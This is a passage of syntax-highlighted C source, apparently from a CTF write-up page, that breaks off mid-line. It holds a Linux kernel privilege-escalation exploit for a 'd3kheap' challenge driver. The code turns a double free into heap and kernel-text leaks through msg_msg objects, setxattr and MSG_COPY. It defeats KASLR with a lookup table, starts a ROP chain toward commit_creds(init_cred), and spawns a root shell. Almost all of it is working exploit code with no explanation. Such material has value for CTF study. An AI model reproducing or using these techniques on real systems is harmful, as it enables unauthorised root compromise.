class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">kernelLeakQuery</span><span class="params">(<span class="keyword">size_t</span> kernel_text_leak)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">switch</span> (kernel_text_leak &amp; <span class="number">0xfff</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6e9</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff812b76e9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x980</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82101980</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x440</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e77440</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xde7</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82411de7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x4f0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff817894f0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xc90</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff833fac90</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x785</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff823c3785</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x990</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff810b2990</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x900</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e49900</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x8b4</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8111b8b4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xc40</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8204ac40</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x320</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8155c320</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xee0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff810d6ee0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5e0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff810e55e0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xe80</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82f05e80</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x260</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82ec0260</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xb50</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82dd4b50</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x620</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8109e620</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xa00</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82f04a00</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x300</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff81b25300</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xbe0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e11be0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x8b0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8115b8b0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5da</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff824505da</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x3c2</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff824073c2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xd80</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82eaed80</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5cb</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff824505cb</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x3c3</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8240b3c3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] fill up your dict!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((kernel_offset % <span class="number">0x100000</span>) != <span class="number">0</span>) <span class="comment">// miss hit?</span></span><br><span class="line">        kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">return</span> kernel_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125; msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0xDEAD</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open d3kheap error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_heap_leak;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pointer_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> kmsg_idx;</span><br><span class="line">    <span class="keyword">int</span> ms_qid[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_text_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kmsg_addr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pipe_fd2[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_ops_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_ops_addr;</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span> + i, <span class="number">0X1000</span> - <span class="number">8</span>);</span><br><span class="line">        ret = msgsnd(ms_qid[i], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;Z&#x27;</span>, <span class="number">0x1000</span> - <span class="number">8</span>);</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_ts = <span class="number">0x1000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pointer_buf = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br><span class="line">    kernel_heap_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;[----data dump----][%d] %p\n&quot;, i, pointer_buf[i]);</span></span><br><span class="line">        <span class="keyword">if</span> (((pointer_buf[i] &amp; <span class="number">0xffff000000000000</span>) == <span class="number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (pointer_buf[i + <span class="number">3</span>] == (<span class="number">1024</span> - <span class="number">0x30</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, pointer_buf[i]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;idx=&gt;%d\n&quot;</span>, (<span class="keyword">int</span>)(((<span class="keyword">char</span> *)(&amp;pointer_buf[i + <span class="number">2</span>]))[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>));</span><br><span class="line">            idx = (<span class="keyword">int</span>)(((<span class="keyword">char</span> *)(&amp;pointer_buf[i + <span class="number">2</span>]))[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            kernel_heap_leak = pointer_buf[i];</span><br><span class="line">            fake_ops_offset = i * <span class="number">8</span> + <span class="number">0x30</span> - <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!kernel_heap_leak)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to leak kernel heap!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    search_addr = kernel_heap_leak - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> leaking_times = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;next = search_addr;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">        setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);</span><br><span class="line">        ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">        leaking_times++;</span><br><span class="line">        <span class="keyword">if</span> (leaking_times == <span class="number">100</span> &amp;&amp; !kernel_text_leak)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">            search_addr += <span class="number">0x1000</span> - <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pointer_buf = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br><span class="line">        <span class="keyword">if</span> (leaking_times == <span class="number">1</span> &amp;&amp; !kmsg_addr)</span><br><span class="line">        &#123;</span><br><span class="line">            kmsg_addr = pointer_buf[(<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">            fake_ops_addr = kmsg_addr - fake_ops_offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] fake ops addr=&gt;%p\n&quot;</span>, fake_ops_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = (<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i &lt; (<span class="number">0x2000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((pointer_buf[i] &gt; <span class="number">0xffffffff81000000</span>) &amp;&amp; (pointer_buf[i] &lt; <span class="number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, pointer_buf[i]);</span><br><span class="line">                kernel_text_leak = pointer_buf[i];</span><br><span class="line">                kernel_offset = kernelLeakQuery(kernel_text_leak);</span><br><span class="line">                <span class="keyword">if</span> (kernel_offset == <span class="number">0xdeadbeef</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[-] cant found kernel offset\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                kernel_base = kernel_offset + <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; kernel_text_leak &lt; <span class="number">0xffffffffbfffffff</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_list.next = search_addr;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_list.prev = search_addr;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">    ret = msgrcv(ms_qid[idx], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] the gap is freed&quot;</span>);</span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free done!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe(pipe_fd2);</span><br><span class="line">    <span class="built_in">memset</span>(pointer_buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    pointer_buf[<span class="number">1</span>] = <span class="number">0xffffffff812dbede</span> + kernel_offset;</span><br><span class="line">    pointer_buf[<span class="number">2</span>] = fake_ops_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810938f0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff82c6d580</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_cred = <span class="number">0xffffffff810d25c0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = <span 